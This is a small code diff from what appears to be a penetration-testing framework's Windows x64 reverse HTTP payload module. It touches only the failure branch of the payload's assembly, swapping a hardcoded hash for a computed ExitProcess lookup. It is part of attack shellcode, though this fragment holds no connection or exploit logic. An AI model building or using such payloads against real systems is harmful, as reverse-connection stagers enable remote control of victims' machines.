@@ -376,9 +376,9 @@ module Payload::Windows::ReverseHttp_x64
     else
       asm << %Q^
       failure:
-        push rbx                      ; stack alignment
-        push 0x56A2B5F0               ; hardcoded to exitprocess for size
-        call rbp
+        ; hard-coded to ExitProcess(whatever) for size
+        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
+        call rbp              ; ExitProcess(whatever)
       ^
     end
 
